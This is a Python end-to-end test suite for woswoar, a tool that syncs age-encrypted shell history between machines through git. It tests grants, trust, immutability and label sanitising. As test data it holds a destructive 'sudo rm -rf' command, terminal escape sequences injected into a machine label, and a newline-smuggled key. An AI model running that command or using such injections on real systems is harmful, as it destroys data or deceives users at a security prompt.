"""End-to-end sync: two machines exchanging history through a bare repo.

These drive the real ``age`` and the real ``git``. Mocking either would test the
mock -- the whole premise of sync is that ordinary git plus ordinary age
are enough, and that is only meaningful if it is actually demonstrated.
"""

from __future__ import annotations

import contextlib
import io
import os
import secrets
import shutil
import subprocess
import tempfile
import time
import tracemalloc
import unittest
import zlib
from collections.abc import Callable, Iterator
from contextlib import contextmanager, redirect_stderr
from pathlib import Path
from typing import Any, ClassVar
from unittest import mock

from woswoar import (
    archive,
    cache,
    crypto,
    errors,
    gitrepo,
    manifest,
    progress,
    prove,
    search,
    store,
    sync,
)
from woswoar.__main__ import main
from woswoar.entry import Entry, format_line
from woswoar.gitrepo import COMMIT_MESSAGE as COMMIT
from woswoar.install import HOOKS
from woswoar.install import hook_bytes as main_hook_bytes
from woswoar.sync import _GRANT_REMEDY

from . import support
from .support import requires_age, requires_git, requires_ssh_keygen

#: One authoritative list, plus the HOME these tests give each machine of its
#: own -- `WoswoarTestCase` redirects it once for the whole suite, and here
#: every simulated machine needs a different one.
_ENV = (*support.ENV_KEYS, "HOME")

#: `gc --auto` runs after a commit and after a push, and `gc.autoDetach` sends
#: it to the background -- so it is still repacking while the *next* git command
#: runs. A real installation wants exactly that. These tests want a repo that
#: changes only when they change it, and every one of the five red mains before
#: this came of not having one, in three different disguises:
#:
#: - a clone dying on a loose object the background prune had already removed,
#:   twice, in two unrelated tests;
#: - `git gc` in a test colliding with the repack already running there:
#:   "failed to run repack", "could not find pack '.tmp-...'";
#: - teardown finding the directory not empty, which `ignore_cleanup_errors`
#:   did not absorb on 3.12.
#:
#: None of those is the hazard under test, and a suite that reddens somewhere
#: new each time teaches people to re-run it rather than read it. What makes the
#: *clone* safe is `--no-local`, which has its own test; this only stops git's
#: housekeeping showing up as whichever test was unlucky.
#:
#: The constant itself lives in `prove`, which builds the same kind of
#: short-lived repository for users and would show the same flakes as a failed
#: proof; one copy, so a knob learned here reaches there and back.
QUIET_MAINTENANCE = prove.QUIET_MAINTENANCE


class Fake:
    """One simulated machine with its own config, logs, and clone."""

    def __init__(self, root: Path, name: str) -> None:
        self.root = root / name
        self.name = name
        self._id: str | None = None
        for sub in ("data", "conf", "cache"):
            (self.root / sub).mkdir(parents=True, exist_ok=True)
        # This machine's HOME, so its clone inherits it.
        (self.root / ".gitconfig").write_text(QUIET_MAINTENANCE, encoding="utf-8")

    @property
    def env(self) -> dict[str, str]:
        return {
            "HOME": str(self.root),
            "WOSWOAR_DIR": str(self.root / "data"),
            "XDG_CONFIG_HOME": str(self.root / "conf"),
            "XDG_CACHE_HOME": str(self.root / "cache"),
        }

    @contextmanager
    def active(self) -> Iterator[Fake]:
        """Run a block as if we were sitting at this machine."""
        saved = {k: os.environ.get(k) for k in _ENV}
        os.environ.pop("WOSWOAR_SESSION", None)
        os.environ.update(self.env)
        try:
            yield self
        finally:
            for key, value in saved.items():
                if value is None:
                    os.environ.pop(key, None)
                else:
                    os.environ[key] = value

    # -- convenience, all assuming `active()` is held ----------------------

    @property
    def id(self) -> str:
        """This machine's id, resolved once and remembered.

        Deliberately cached: store.machine() reads the *ambient* environment, so
        a live lookup would quietly return the wrong machine's id whenever one
        Fake is inspected while another is active -- which is most assertions in
        a two-machine test.
        """
        if self._id is None:
            self._id = store.machine().id
        return self._id

    def record(self, day: str, ts: int, cmd: str, session: str = "s1") -> None:
        """Append a line the way the shell hook would.

        Through `store.private_append`, because the hook creates its day file
        owner-only; a raw ``open("a")`` here would leave 0644 files that no
        real recording path produces.
        """
        entry = Entry(ts, self.id, session, "~/src", 0, 5, cmd)
        with store.private_append(store.log_file(self.id, day)) as handle:
            handle.write(format_line(entry) + "\n")

    def commands(self) -> set[str]:
        return {e.cmd for e in cache.load_entries()}

    def entries(self) -> list[Entry]:
        """Everything merged here, *not* deduplicated.

        `commands()` is a set, and a set is exactly what hides a day written
        twice over -- which is what a rewrite that should have happened and did
        not leaves behind.
        """
        return cache.load_entries()

    def append_recipient(self, name: str = "") -> str:
        """Enrol a machine behind woswoar's back, and return its recipient.

        Written straight into the repo rather than through `sync.add_recipient`,
        because that is what the other end of a shared repo looks like: files
        that arrived by `git pull`, whose contents nothing here sanitised.

        ``name`` fabricates the host directory that gives the key a name --
        `signer.pub` to claim it and a `.name` mirror to hold it -- because that
        is where a name lives now. It is not a trusted path: sealing a file to
        the published recipients needs no secret, so a name is still attacker
        text and is still shown quoted beside a fingerprint.
        """
        key = crypto.generate_identity().public
        with archive.recipients_file().open("a", encoding="utf-8") as handle:
            handle.write(f"{key}\n")
        if name:
            host = secrets.token_hex(8)
            verify_key = crypto.generate_signing_key(self.root / f"signer-{host}")
            store.write_atomic(archive.signer_public(host), f"{verify_key}\n{key}\n".encode())
            store.write_atomic(store.name_file(host), f"{name}\n".encode())
        return key


@requires_age
@requires_git
class SyncTestCase(unittest.TestCase):
    def setUp(self) -> None:
        # `ignore_cleanup_errors` because git may still be finishing background
        # maintenance in the repo when the directory goes: it creates a file
        # under `.git` between the walk and the rmdir, and `rmtree` fails with
        # "Directory not empty". Measured at about one run in forty, on this
        # branch and on main alike, so it is a teardown race rather than
        # anything under test -- and a suite that reddens at random teaches
        # people to re-run it rather than read it. It did not always absorb it:
        # main went red on 3.12 with "Directory not empty" here regardless.
        # QUIET_MAINTENANCE removes the writer that loses the race, which is the
        # better fix; the tolerance stays because it costs nothing and proving
        # the absence of a one-in-forty event does not.
        self._tmp = tempfile.TemporaryDirectory(prefix="woswoar-sync-", ignore_cleanup_errors=True)
        self.addCleanup(self._tmp.cleanup)
        self.root = Path(self._tmp.name)

        self.origin = self.root / "origin.git"
        subprocess.run(
            ["git", "init", "--quiet", "--bare", str(self.origin)], check=True, timeout=60
        )
        # In the repo itself, not just in a HOME: a push's `receive-pack` runs
        # here with the *pushing* machine's environment, and the origin outlives
        # any one of them.
        (self.origin / "config").write_text(
            (self.origin / "config").read_text(encoding="utf-8") + QUIET_MAINTENANCE,
            encoding="utf-8",
        )

    def machine(self, name: str, enrol: bool = True, display: str | None = None) -> Fake:
        fake = Fake(self.root, name)
        if enrol:
            with fake.active():
                if display:
                    # Set before init: name.age is sealed during enrolment.
                    store.save_machine(store.machine()._replace(name=display))
                # A dedicated identity, not the developer's real SSH key.
                sync.initialise(remote=str(self.origin), new_identity=True)
                _ = fake.id  # resolve while this machine's env is in effect
        return fake

    def git_in_repo(self, fake: Fake, *args: str) -> str:
        with fake.active():
            return gitrepo.git(*args)

    @staticmethod
    def plant_manifest(work: Path, host_id: str, day: str, key: Path, *chunks: Path) -> None:
        """A well-formed manifest naming ``chunks``, signed with a key of our own.

        Exactly what push access alone can build: correct framing, a correct
        header, real digests -- and the wrong signature. ``chunks`` is named
        rather than listed off the directory on purpose; signing whatever happens
        to be there would make the fixture depend on how much real history the
        clone already had, and the tests using this are about one planted chunk.

        Here because both callers used to spell out `manifest._body`, the
        `ssh-keygen` call and the framing -- including a literal ``b"\n\n"``
        where `manifest._SEPARATOR` is what decides it. That is the repository's
        file format written down in a test, once per test.
        """
        listed = {
            chunk.name: manifest.ManifestEntry(manifest.digest_of(chunk.read_bytes()))
            for chunk in chunks
        }
        body = manifest._body(host_id, day, listed)
        signature = crypto.sign(body.encode("utf-8"), key, manifest._MAGIC)
        signed = work / "hosts" / host_id / "manifests" / day
        signed.parent.mkdir(parents=True, exist_ok=True)
        signed.write_bytes(
            signature.decode("utf-8").strip().encode()
            + manifest._SEPARATOR.encode("utf-8")
            + body.encode("utf-8")
        )

    def publish_repo_edit(self) -> None:
        """Commit and push a change made to the repo behind `sync`'s back.

        `sync` commits only when it wrote something itself, so a test that edits
        the repo directly has to publish the edit rather than wait for the next
        sync to stage it. Call from inside the editing machine's `active()`.
        """
        gitrepo.commit()
        gitrepo.push(gitrepo.read_repo())

    def history_across_days(self, days: int, per_day: int) -> tuple[Fake, Fake]:
        """alpha with `days` days of `per_day` commands, each its own chunk,
        and a beta that has been granted but has merged nothing yet."""
        alpha = self.machine("alpha")
        with alpha.active():
            for day in range(days):
                base = 1_700_000_000 + day * 100_000
                for i in range(per_day):
                    alpha.record(f"2023-11-{14 + day:02d}", base + i, f"day {day} command {i}")
                    sync.run(now=base + 500 + i)
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        return alpha, beta

    def accept_everyone(self, fake: Fake) -> None:
        """Accept every machine publishing here, as a human at ``fake`` would.

        The ceremony this design costs, and only in one direction: a machine
        that cloned *after* another enrolled pinned it on the spot, but one that
        cloned before has never been told the newcomer exists. What the repo
        says can never add trust on its own -- anyone who can push can write to
        it -- so a person at this machine has to say so.
        """
        with fake.active():
            sync.trust(sync.trust_candidates())

    def settle(self, machine: Fake, host: Fake, *days: str) -> None:
        """Age a day directory past `RACY_WINDOW_NS`, as a minute of real time does.

        A day written moments ago is deliberately not stamped: its mtime cannot
        yet rule out another write landing in the same filesystem tick. Every
        real day reaches that state within seconds; a test would otherwise have
        to sleep through it.
        """
        aged = time.time() - sync.RACY_WINDOW_NS / 1e9 - 60
        with machine.active():
            for day in days:
                os.utime(archive.chunk_dir(host.id, day), (aged, aged))

    def run_cli(self, fake: Fake, *argv: str, tty: bool = False) -> support.Ran:
        """Drive the real CLI as ``fake``. Both streams -- see `support.run_cli`."""
        with fake.active():
            return support.run_cli(*argv, tty=tty)


class TestSingleMachine(SyncTestCase):
    def test_export_seals_and_pushes(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            report = sync.run()
            self.assertEqual(report.chunks_written, 1)
            self.assertEqual(report.lines_exported, 1)
            self.assertTrue(report.pushed)

    def test_nothing_new_writes_no_chunk(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            again = sync.run()
            self.assertEqual(again.chunks_written, 0)
            self.assertEqual(again.lines_exported, 0)

    def test_nothing_readable_leaks_into_the_repo(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "sudo rm -rf /very-secret-path")
            sync.run()
            # Through the same scanner `doctor --prove` ships, so the suite and
            # the user-facing proof cannot disagree about what "no readable
            # byte" means. It inflates the git objects too: a raw walk cannot
            # see into a superseded revision of a rewritten file, which lives
            # only zlib-compressed under `objects/` -- and is pushed all the
            # same.
            blob = b"".join(data for _, data in prove._published_bytes(store.history_dir()))
        self.assertNotIn(b"very-secret-path", blob)
        self.assertNotIn(b"sudo", blob)

    def test_partial_final_line_is_not_sealed_until_complete(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            path = store.log_file(alpha.id, "2023-11-14")
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text("1700000001\ts1\t~/src\t0\t5\tcomplete\n1700000002\ts1", "utf-8")

            sync.run()
            state = sync.State.load()
            relpath = f"hosts/{alpha.id}/2023-11-14.tsv"
            # The watermark stops at the last newline, so the half-written record
            # is left for next time rather than sealed into an immutable chunk.
            self.assertEqual(state.exported[relpath], path.stat().st_size - len("1700000002\ts1"))


class TestTwoMachines(SyncTestCase):
    def test_history_reaches_the_other_machine(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            alpha.record("2023-11-14", 1_700_000_002, "make -j8")
            sync.run()

        beta = self.machine("beta")
        with beta.active():
            sync.run()
        # beta joined after alpha sealed those lines, so it cannot read them yet.
        # One command on an already-enrolled machine is the whole fix, exactly
        # as documented -- no surrounding sync to fetch beta's key or publish.
        with alpha.active():
            sync.grant()
        with beta.active():
            report = sync.run()
            self.assertEqual(report.chunks_merged, 1)
            self.assertEqual(beta.commands(), {"git status", "make -j8"})

    def test_grant_alone_gives_access_without_a_surrounding_sync(self) -> None:
        """The recipient list is a file in the working tree.

        Re-sealing against a checkout taken before the new machine enrolled
        rewrites every key to the *old* recipients and reports full success,
        while granting nothing. So `grant` has to fetch first, and this
        pins that it does -- alpha never syncs after beta joins.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

        beta = self.machine("beta")  # init publishes beta's public key
        with alpha.active():
            report = sync.grant()
            self.assertTrue(report.pushed)
            self.assertEqual(report.skipped, 0)
            self.assertGreater(report.resealed, 0)

        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"git status"})

    def test_a_new_machine_cannot_grant_to_itself(self) -> None:
        """Re-sealing means opening the key first, which beta cannot do.

        This is the property the encryption rests on, not a missing feature:
        a machine nobody granted access to must not be able to grant itself
        access. It must say so rather than report a successful no-op.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

        beta = self.machine("beta")
        with beta.active():
            sync.run()
            report = sync.grant()
            # It re-seals what it owns -- its own name seal -- and skips both
            # alpha's day key and the repo key, so it still cannot read
            # anything, and above all cannot authorise itself to.
            self.assertGreater(report.skipped, 0)
            self.assertTrue(sync.run().subjects(sync.UNREADABLE))
            self.assertEqual(beta.commands(), set())

    def test_a_machine_waiting_for_grant_publishes_at_once_and_only_reads_later(self) -> None:
        """The state between `init` and `grant`, which is normal, not an error.

        Publishing needs nothing from anybody: this machine signs with a key of
        its own and seals to a day key it mints itself. Only *reading* waits.
        That is a change -- under the shared key it could not tag a chunk
        either, so its own history piled up locally until someone else acted.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

        beta = self.machine("beta")
        with beta.active():
            beta.record("2023-11-15", 1_700_100_000, "beta's own command")
            report = sync.run()
            self.assertEqual(report.lines_exported, 1, "beta should publish without waiting")
            self.assertTrue(
                report.subjects(sync.UNREADABLE), "but it cannot read alpha's history yet"
            )
            self.assertEqual(beta.commands(), {"beta's own command"})

        # And alpha, which cloned first, sees it once a human there accepts it.
        self.accept_everyone(alpha)
        with alpha.active():
            self.assertEqual(sync.run().lines_imported, 1)
            self.assertIn("beta's own command", alpha.commands())

        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"beta's own command", "git status"})

    def test_merging_is_idempotent(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            sync.grant()
        with beta.active():
            sync.run()
            first = len(cache.load_entries())
            for _ in range(3):
                sync.run()
            self.assertEqual(len(cache.load_entries()), first, "re-sync duplicated entries")

    def test_offline_backlog_spanning_days(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            sync.run()
            sync.grant()
        with beta.active():
            sync.run()

        with alpha.active():
            for day, ts in (("2023-11-14", 1_700_000_001), ("2023-11-15", 1_700_100_000)):
                alpha.record(day, ts, f"command on {day}")
            # One sync after several days offline: a chunk per day, because a
            # chunk always belongs to exactly one day file.
            report = sync.run()
            self.assertEqual(report.chunks_written, 2)

        with beta.active():
            sync.run()
            self.assertEqual(beta.commands(), {"command on 2023-11-14", "command on 2023-11-15"})

    def test_other_machines_name_is_learned(self) -> None:
        alpha = self.machine("alpha", display="alpha@laptop")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            sync.grant()
        with beta.active():
            sync.run()
            # Without this, search would label alpha's entries with its opaque id.
            self.assertEqual(store.host_names().get(alpha.id), "alpha@laptop")

    def test_search_spans_hosts_but_host_scope_does_not(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "from alpha")
            sync.run()
            sync.grant()
        with beta.active():
            beta.record("2023-11-14", 1_700_000_050, "from beta")
            sync.run()

            def recall(scope: search.Scope) -> list[str]:
                # One width, decided once and used for both, as the picker does.
                width = search.host_width_for(set(store.host_names()))
                return [
                    search.command_from_line(line, width)
                    for line in search.lines_for(scope, host_width=width)
                ]

            self.assertEqual(len(recall("global")), 2)
            self.assertEqual(recall("host"), ["from beta"])


class TestAFinderVisitDoesNotBreakSync(SyncTestCase):
    """`.DS_Store` in the history checkout (#160).

    Finder writes one into any directory it is asked to display, and the history
    repo is a git working tree under the user's home -- so one arrives the first
    time anybody looks at their history in a file manager. `sync` stages with
    `git add -A`, so without a `.gitignore` it is committed and pushed, and two
    machines whose Finders disagree about it produce a binary conflict on the
    rebase `sync` does.

    Written by hand here rather than by a Mac: that is the point. This has to be
    pinned by the Linux suite or it regresses the moment nobody is testing on a
    Mac -- which today is everybody.
    """

    def litter(self, fake: Fake, *directories: Path) -> None:
        """Put a `.DS_Store` in each directory, as Finder would.

        Takes paths from `store` rather than strings to join onto
        `history_dir()`: the repo layout is that module's to know, and a
        hand-spelled `hosts/<id>/<day>` plus `mkdir(parents=True)` would go on
        creating an obsolete directory -- and passing -- if the layout changed.
        """
        for directory in directories:
            (directory / ".DS_Store").write_bytes(b"\x00\x00\x00\x01Bud1")

    def test_the_repo_carries_a_gitignore_for_it(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            text = (store.history_dir() / archive.GITIGNORE).read_text(encoding="utf-8")
        self.assertIn(".DS_Store", text)

    def test_a_repo_that_predates_it_acquires_one_on_the_next_sync(self) -> None:
        """`init` is not a migration: nobody runs it twice, and re-running it
        TOFU-pins every host in the repository besides.

        Asserting it on a machine that has just enrolled proves nothing about
        this -- the file is there either way. Deleting it and syncing is the
        only fixture that can tell "written at enrolment" from "kept correct",
        and without it a machine that inited on an earlier woswoar would stage a
        `.DS_Store` forever.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            ignore = store.history_dir() / archive.GITIGNORE
            ignore.unlink()
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            self.assertTrue(ignore.is_file(), "an existing repo never gets the ignore rules")
            self.assertIn(".DS_Store", ignore.read_text(encoding="utf-8"))

    def test_supplying_it_does_not_make_every_later_sync_stage_the_tree(self) -> None:
        """ "Only when absent", and that word is what this pins.

        `git add -A` is a full stat of every chunk this machine ever published,
        and `run` skips it when the writers say they wrote nothing -- so a
        `write_gitignore` that rewrote the file each time would report a write on
        every idle sync and put that stat back, once a minute, forever. Writing
        identical bytes makes no commit, so a test that only counted commits
        would pass either way; the staging is the observable thing.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            staged: list[bool] = []
            real = gitrepo.commit

            def counted() -> bool:
                staged.append(True)
                return real()

            with mock.patch.object(gitrepo, "commit", counted):
                sync.run()
            self.assertEqual(staged, [], "an idle sync stated the whole working tree")

    def test_a_sync_neither_stages_it_nor_fails(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
        # Beside real chunks, in the directory a person would actually open --
        # a repo of nothing but `.DS_Store` cannot tell an ignore rule from an
        # empty commit.
        with alpha.active():
            self.litter(
                alpha,
                store.history_dir(),
                archive.repo_host_dir(alpha.id),
                archive.chunk_dir(alpha.id, "2023-11-14"),
            )
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_002, "git commit")
            report = sync.run()
        # It pushed, so the commit that carried the second chunk really was made
        # -- a run that quietly did nothing would also have staged no `.DS_Store`.
        self.assertTrue(report.pushed, "the sync did not get as far as pushing")
        self.assertEqual(report.chunks_written, 1)

        tracked = self.git_in_repo(alpha, "ls-files").split()
        self.assertTrue(tracked, "nothing is tracked, so this asserts nothing")
        self.assertEqual(
            [name for name in tracked if ".DS_Store" in name], [], "Finder's file was committed"
        )

    def test_a_peer_still_reads_the_history_beside_it(self) -> None:
        """The claim that matters: the day is merged and verified, not merely
        that nothing crashed."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "secret-marker-command")
            sync.run()
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
            sync.run()
        with alpha.active():
            self.litter(alpha, archive.chunk_dir(alpha.id, "2023-11-14"))
            sync.run()

        self.accept_everyone(beta)
        with beta.active():
            sync.run()
            self.assertIn(
                "secret-marker-command",
                {entry.cmd for entry in cache.load_entries()},
                "the day did not merge past Finder's file",
            )

    def test_it_is_not_mistaken_for_a_chunk_nobody_signed(self) -> None:
        """A file in a day directory that no manifest lists is exactly what
        `unlisted_chunks` exists to report. It must report *chunks*, not
        everything -- or the first Finder visit reads as tampering."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
        with alpha.active():
            self.litter(alpha, archive.chunk_dir(alpha.id, "2023-11-14"))
            self.assertEqual(sync.unlisted_chunks(), [])


class TestImmutability(SyncTestCase):
    """The invariant the whole storage design rests on."""

    def test_no_chunk_is_ever_modified_or_deleted(self) -> None:
        alpha = self.machine("alpha")
        beta = self.machine("beta")

        with alpha.active():
            for i in range(4):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"alpha {i}")
                sync.run()
            sync.grant()
        with beta.active():
            for i in range(3):
                beta.record("2023-11-15", 1_700_100_000 + i, f"beta {i}")
                sync.run()
        with alpha.active():
            sync.run()

        # Exact, not a heuristic: if any commit ever modified or deleted a
        # chunk, this lists it. An empty result is the guarantee that repo
        # growth equals the bytes written.
        touched = self.git_in_repo(
            alpha,
            "log",
            "--all",
            "--diff-filter=MD",
            "--name-only",
            "--pretty=format:",
            "--",
            "hosts",
        )
        # Every rewritten path, not just the `*.age` ones. Filtering by suffix
        # first made the allowlist below vacuous for anything not named `.age`,
        # so a rewritten manifest -- or any future file -- would have sailed
        # through an assertion that reads like it covers the tree.
        rewritten = {line for line in touched.splitlines() if line.strip()}

        # Chunks live under hosts/<id>/YYYY-MM-DD/. Key files, name seals,
        # signer keys and manifests sit elsewhere in the tree and *are*
        # rewritten, by design: that is what makes onboarding cheap and what
        # lets a day's signed list grow as the day goes on. Separating the two
        # here keeps the exception explicit rather than quietly widening the
        # invariant. Classified by store, not by a regex copied here: a
        # hand-maintained pattern would silently stop matching if the layout
        # changed, leaving this vacuously true while real chunks were rewritten.
        chunks = {p for p in rewritten if archive.is_chunk_path(p)}
        self.assertEqual(sorted(chunks), [], f"chunks were rewritten: {sorted(chunks)}")

        # And the only things that were rewritten are the ones allowed to be.
        allowed = ("/keys/", "/manifests/")
        self.assertTrue(
            all(
                any(part in p for part in allowed)
                or p.endswith("/name.age")
                or p.endswith("/signer.pub")
                for p in rewritten
            ),
            f"unexpected rewrites: {sorted(rewritten - chunks)}",
        )

    def test_repo_growth_tracks_bytes_written_not_sync_count(self) -> None:
        syncs = 20
        alpha = self.machine("alpha")
        with alpha.active():
            for i in range(syncs):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command number {i}")
                sync.run()

            self.git_in_repo(alpha, "gc", "--quiet")
            # git's own reported object size. Summing files under .git would
            # instead measure the sample hooks, which dwarf a repo this small.
            counts = dict(
                line.split(": ", 1)
                for line in self.git_in_repo(alpha, "count-objects", "-v").splitlines()
                if ": " in line
            )
            stored = int(counts["size-pack"]) * 1024 + int(counts["size"]) * 1024
            chunk_bytes = sum(c.path.stat().st_size for c in archive.iter_chunks(alpha.id))
            chunks = len(list(archive.iter_chunks(alpha.id)))

        self.assertEqual(chunks, syncs, "each sync must produce exactly one chunk")
        # Chunks are written once and never rewritten, so git stores each
        # exactly once: total objects stay close to the bytes actually written.
        # Re-encrypting the whole day file each sync would instead store
        # 1+2+...+N copies and blow straight past this.
        self.assertLess(
            stored,
            chunk_bytes * 4 + 64 * 1024,
            f"stored={stored} chunk_bytes={chunk_bytes} over {syncs} syncs",
        )


class TestChunkPayload(unittest.TestCase):
    """The chunk encoding, without needing age or git."""

    def test_round_trip(self) -> None:
        for data in (b"", b"x", b"a line\n", b"repeated line\n" * 500, bytes(range(256))):
            self.assertEqual(sync.unpack(sync.pack(data)), data)

    def test_repetitive_input_shrinks(self) -> None:
        # Shell history is repetitive by nature, and this is the one moment it
        # can be compressed: once sealed, ciphertext is incompressible forever.
        data = b"1700000000\ts1\t~/src\t0\t5\tgit status\n" * 200
        self.assertLess(len(sync.pack(data)), len(data) // 10)

    def test_a_tiny_chunk_costs_only_a_few_bytes(self) -> None:
        """Deflate has a floor, and one very short line can land above it.

        This is what `pack` used to avoid by tagging each payload raw-or-
        deflated and keeping the smaller. It was not worth it: the tag cost a
        byte on every chunk that *did* compress, which is all but the shortest,
        and the worst case it bought back is the handful of bytes below --
        against a sealed chunk that already carries a 200-byte age header.
        """
        data = b"1700000000\ts1\t~\t0\t5\tls\n"
        self.assertLess(len(sync.pack(data)) - len(data), 8)

    def test_a_payload_we_cannot_read_is_refused(self) -> None:
        # Loudly, rather than decoding into garbage that then gets appended to
        # a log file and cached. `_merge_host` turns this into an unreadable
        # chunk rather than letting it abort the sync.
        truncated = zlib.compress(b"x" * 5000)[:20]
        for blob in (b"\x7fanything", b"", b"1700000000\ts1\t~\t0\t5\tls\n", truncated):
            with self.assertRaises(zlib.error):
                sync.unpack(blob)


class TestGrantConfirmation(SyncTestCase):
    """`grant` widens who can read everything, so it says so and asks first."""

    def test_readers_are_labelled_for_a_human(self) -> None:
        # `age1ejf3l4f0nhnp9...` is not something anyone can consent to.
        alpha = self.machine("alpha", display="martinus@box")
        with alpha.active():
            labels = {reader.label for reader in sync.readers()}
        self.assertIn("martinus@box", labels)

    def test_a_machine_that_just_enrolled_is_named_before_it_has_synced(self) -> None:
        """The name has to be there at the prompt, not one sync later.

        `name_for` reads the mirror a *merge* fills, and a machine you are being
        asked to grant is by definition one whose history you have never merged.
        So the confirmation that widens access to everything showed `(unnamed)`,
        and the name appeared afterwards, when nobody was being asked anything.
        Reported from a real two-machine setup.

        The sealed name is in the tree by now -- `readers` fetches -- so this is
        a decrypt of something already present.
        """
        alpha = self.machine("alpha", display="martin@desktop")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

        # Enrols, pushes its name, and merges nothing. Exactly the state a
        # newcomer is in when someone turns to the old machine and runs `grant`.
        self.machine("beta", display="martin@laptop")

        with alpha.active():
            labels = {reader.label for reader in sync.readers()}
        self.assertIn("martin@laptop", labels, f"the newcomer is unnamed: {labels}")
        self.assertNotIn(sync.UNNAMED, labels)

    def test_trust_names_the_machine_it_is_asking_about(self) -> None:
        """`trust` had it worse: it is *only* ever asked about an unmerged host.

        Every candidate it listed was therefore `(unnamed)`, while README.md
        showed a name in that very prompt.
        """
        alpha = self.machine("alpha", display="martin@desktop")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()

        beta = self.machine("beta", display="martin@laptop")
        with beta.active():
            beta.record("2023-11-15", 1_700_100_001, "cargo build")
            sync.run()

        with alpha.active():
            labels = {c.label for c in sync.trust_candidates()}
        self.assertEqual(labels, {"martin@laptop"})

    def test_a_key_with_no_name_yet_is_not_named_after_itself(self) -> None:
        """The fallback label used to be an abbreviation of the key.

        That let a *chosen* label impersonate one, which was the whole weakness.
        A name can no longer be derived from a key at all -- it comes from the
        sealed `name.age` or it is the placeholder -- so this pins the placeholder
        rather than the abbreviation it replaced.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            key = alpha.append_recipient()
            (reader,) = [r for r in sync.readers() if r.key == key]

        self.assertEqual(reader.label, sync.UNNAMED)
        self.assertFalse(any(part and part in key for part in reader.label.split("...")))

    def test_a_key_listed_twice_is_offered_to_age_once(self) -> None:
        """`recipients.txt` is `merge=union`.

        Two machines appending the same key, one labelled and one not, leaves
        both lines -- and age rejects a repeated recipient.
        """
        alpha = self.machine("alpha", display="box")
        with alpha.active():
            key = sync.recipients()[0]
            path = archive.recipients_file()
            path.write_text(f"{key}\n{key}{sync._LABEL_SEP}box\n", encoding="utf-8")
            self.assertEqual(sync.recipients(), [key])
            # And it is still usable, which is the point of deduplicating.
            crypto.encrypt_to_recipients(b"x", sync.recipients())

    def test_granting_refuses_if_the_machines_changed_while_deciding(self) -> None:
        """A confirmation that can under-report what it authorises is worse
        than none, so the approved list is checked against the fetched one."""
        alpha = self.machine("alpha")
        with alpha.active():
            approved = [reader.key for reader in sync.readers()]
        self.machine("beta")  # enrols behind alpha's back

        with alpha.active(), self.assertRaises(errors.SyncError) as caught:
            sync.grant(approved=approved)
        self.assertIn("changed while you were deciding", str(caught.exception))

    def test_granting_with_the_approved_list_goes_ahead(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            report = sync.grant(approved=[reader.key for reader in sync.readers()])
            self.assertGreater(report.resealed, 0)

    def test_a_label_cannot_drive_the_terminal(self) -> None:
        """`\\x1b[1A\\x1b[2K` moves the cursor up a line and erases it.

        A label is free text appended by whoever added the key, so on a shared
        repo it is attacker input, and the one place it is printed is the prompt
        where a human decides who may read everything.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.append_recipient(name="martin@laptop\x1b[2K\x1b[1A")
            for reader in sync.readers():
                self.assertNotIn("\x1b", reader.label)
                self.assertNotIn("\n", reader.label)

    def test_a_key_that_is_not_one_line_is_refused_rather_than_written(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active(), self.assertRaises(errors.SyncError) as caught:
            sync.add_recipient(f"{crypto.generate_identity().public}\nage1intruder")
        self.assertIn("not one line", str(caught.exception))

    def test_two_keys_with_one_name_are_told_apart(self) -> None:
        """The defence is not that duplicate names are impossible -- two
        machines really can share one -- it is that the identity shown is
        derived from the key, and that the collision is said out loud.
        """
        alpha = self.machine("alpha", display="martin@laptop")
        with alpha.active():
            alpha.append_recipient(name="martin@laptop")
            readers = sync.readers()

        self.assertEqual({reader.label for reader in readers}, {"martin@laptop"})
        self.assertEqual(len({reader.fingerprint for reader in readers}), 2)
